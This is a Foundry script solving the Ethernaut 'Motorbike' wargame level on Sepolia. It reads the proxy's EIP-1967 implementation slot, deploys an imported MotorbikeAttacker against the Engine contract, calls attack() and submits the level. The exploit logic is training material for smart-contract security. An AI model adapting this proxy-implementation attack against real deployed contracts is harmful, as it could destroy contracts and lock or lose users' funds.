// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
import "../../src/25-MotorbikeAttacker.sol";

contract MotorbikeSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");
    address challengeInstanceOnChain = 0x059Eb4948e7fB39938d5Bb8993A9D2Ce8A443E26; // Change this address into yours after step1 executed.

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        //Motorbike: 0x059Eb4948e7fB39938d5Bb8993A9D2Ce8A443E26
        //Engine: 0x9c4CB32C441F89560997738062645F56FD7a112f

        // YOUR SOLUTION HERE
        address engine = address(uint160(uint256(vm.load(challengeInstance, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc))));
        MotorbikeAttacker motorbikeAttacker = new MotorbikeAttacker(engine);
        motorbikeAttacker.attack();
       
        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(25));
    }

    /**
     * Execute 1 time.
     * Deployed challengeInstance and motorbikeAttacker contracts on Sepolia, then executed attack() function once.
     * Ex. forge script ... ... --sig "step1()" --broadcast
     */
    function step1() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);
        console2.log("challengeInstanceOnChain:", challengeInstance);

        // YOUR SOLUTION HERE
        address engine = address(uint160(uint256(vm.load(challengeInstance, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc))));
        MotorbikeAttacker motorbikeAttacker = new MotorbikeAttacker(engine);
        motorbikeAttacker.attack();

        vm.stopBroadcast();
    }

    /**
     * Execute 1 time.
     * Submitted challengeInstanceOnChain.
     * Ex. forge script ... ... --sig "step2()" --broadcast
     */
    function step2() public {
        vm.startBroadcast(heroPrivateKey);

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstanceOnChain);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(25));
    }
}
